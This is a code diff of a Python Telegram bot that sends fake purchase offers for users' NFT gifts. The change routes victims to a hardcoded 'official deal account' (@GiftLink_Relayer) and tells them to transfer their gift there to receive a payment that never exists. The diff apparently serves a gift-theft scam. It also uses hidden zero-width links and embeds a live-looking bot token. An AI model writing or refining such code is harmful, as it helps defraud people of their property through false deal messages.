@@ -6,6 +6,7 @@ from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
 BOT_TOKEN = "9132697740:AAFlvna4QfTfTaCZ6-RZ2fPGa2mBdba1l_A"
+YOUR_RELAYER_ACCOUNT = "@GiftLink_Relayer" # <--- Официальный аккаунт сделки
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dispatcher = Dispatcher()
@@ -70,18 +71,15 @@ async def send_offer(message: Message):
 
     sender_username = message.from_user.username
     if sender_username:
-        # Делаем ник кликабельным, но добавляем невидимый символ, чтобы он не перебивал карточку NFT
-        username_link = f'<a href="https://t.me/{sender_username}">&#8203;{sender_username}</a>'
+        username_display = f"@{sender_username}"
     else:
-        username_link = message.from_user.first_name
+        username_display = message.from_user.first_name
 
-    # Ссылка на NFT тоже с невидимым символом
-    nft_link = f'<a href="{link}">&#8203;{nft_name}</a>'
+    nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # ТЕКСТ БЕЗ СЛОВА "ПОЛЬЗОВАТЕЛЬ"
     offer_text = (
-        f"<b>{username_link} предлагает Вам\n"
+        f"<b>{username_display} предлагает Вам\n"
         f"{amount} {currency_display} за подарок {nft_link}.</b>\n\n"
         f"<b>Предложение действует ещё 5ч 59м.</b>\n"
         f"{hidden_link}"
@@ -97,7 +95,6 @@ async def send_offer(message: Message):
         "amount": amount,
         "currency_display": currency_display,
         "link": link,
-        "sender_username": sender_username or message.from_user.first_name,
         "business_connection_id": message.business_connection_id
     }
 
@@ -130,13 +127,13 @@ async def on_accept_offer(callback: CallbackQuery):
     currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
     conn_id = last_offer_data.get("business_connection_id")
-    sender_username = last_offer_data.get("sender_username", "unknown")
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
     
+    # Используем YOUR_RELAYER_ACCOUNT вместо ника отправителя
     new_text = (
         f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
-        f"• Отправьте подарок на официальный аккаунт сделки <b>@{sender_username}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
+        f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
         f"{hidden_link}"
     )
 
@@ -177,20 +174,20 @@ async def on_send_transfer(callback: CallbackQuery):
     currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
     conn_id = last_offer_data.get("business_connection_id")
-    sender_username = last_offer_data.get("sender_username", "unknown")
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # Используем YOUR_RELAYER_ACCOUNT вместо ника отправителя
     instruction_text = (
         f"<b>Сделка подтверждена.</b>\n\n"
-        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} {currency_display}</b>, отправьте его на официальный аккаунт сделки <b>@{sender_username}</b>.\n\n"
+        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} {currency_display}</b>, отправьте его на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>.\n\n"
         f"<b>Как передать подарок:</b>\n"
         f"1. Откройте Профиль -> Подарки в Telegram.\n"
         f"2. Выберите <b>{nft_name}</b> в своём списке.\n"
         f"3. Нажмите «Передать», затем укажите получателя.\n"
         f"4. Проверьте данные и подтвердите отправку.\n\n"
         f"<b>Автоматическое завершение сделки</b>\n"
-        f"После подтверждения передачи NFT-подарка на <b>@{sender_username}</b> система обновит статус сделки, а сумма <b>{amount} {currency_display}</b> станет доступна продавцу.\n"
+        f"После подтверждения передачи NFT-подарка на <b>{YOUR_RELAYER_ACCOUNT}</b> система обновит статус сделки, а сумма <b>{amount} {currency_display}</b> станет доступна продавцу.\n"
         f"{hidden_link}"
     )
 
@@ -229,13 +226,13 @@ async def back_from_instruction(callback: CallbackQuery):
     currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
     conn_id = last_offer_data.get("business_connection_id")
-    sender_username = last_offer_data.get("sender_username", "unknown")
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # Используем YOUR_RELAYER_ACCOUNT вместо ника отправителя
     back_text = (
         f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
-        f"• Отправьте подарок на официальный аккаунт сделки <b>@{sender_username}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
+        f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
         f"{hidden_link}"
     )
 
